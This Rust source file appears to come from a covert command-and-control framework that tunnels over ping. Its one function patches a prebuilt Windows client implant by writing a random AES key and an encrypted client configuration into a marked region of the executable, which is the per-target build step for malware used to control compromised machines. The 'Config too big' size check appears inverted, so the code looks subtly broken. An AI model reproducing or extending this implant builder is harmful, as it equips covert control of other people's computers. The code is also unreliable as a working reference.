use aes::cipher::block_padding::Pkcs7;
use aes::cipher::{BlockEncryptMut, KeyInit};
use anyhow::{anyhow, bail, ensure, Result};
use bincode::Options;
use covert_c2_ping_common::{ClientConfig, BUF_SIZE, KEY_SIZE, STAMP_BYTE};
use rand::Fill;
use tokio::fs::File;
use tokio::io::AsyncReadExt;

pub async fn get_patched_bin<'a>(conf: ClientConfig<'a>, arch: String) -> Result<Vec<u8>> {
    let mut artifact = match arch.as_str() {
        "x86_64" => File::open("static/covert_c2_ping_client.exe").await?,
        _ => bail!("invalid arch"),
    };
    let mut artifact_buf = Vec::new();
    artifact.read_to_end(&mut artifact_buf).await?;
    let stamp_loc = artifact_buf
        .windows(BUF_SIZE)
        .enumerate()
        .find(|(_, win)| win.iter().all(|i| *i == STAMP_BYTE))
        .map(|(i, _)| i)
        .ok_or(anyhow!("Could not find stamp location"))?;
    let key: [u8; KEY_SIZE] = rand::random();
    artifact_buf[stamp_loc..stamp_loc + KEY_SIZE].copy_from_slice(&key);
    let stamp_buf = &mut artifact_buf[stamp_loc + KEY_SIZE..stamp_loc + BUF_SIZE];
    stamp_buf.try_fill(&mut rand::thread_rng())?;
    let serializer = bincode::options().allow_trailing_bytes();
    let conf_data = serializer.serialize(&conf)?;
    ensure!(conf_data.len() >= stamp_buf.len(), "Config too big");
    stamp_buf[0..conf_data.len()].copy_from_slice(&conf_data);

    let encryptor = aes::Aes256Enc::new_from_slice(&key)?;
    encryptor
        .encrypt_padded_mut::<Pkcs7>(stamp_buf, stamp_buf.len() - 1)
        .or(Err(anyhow!("Failed to encrypt")))?;
    Ok(artifact_buf)
}
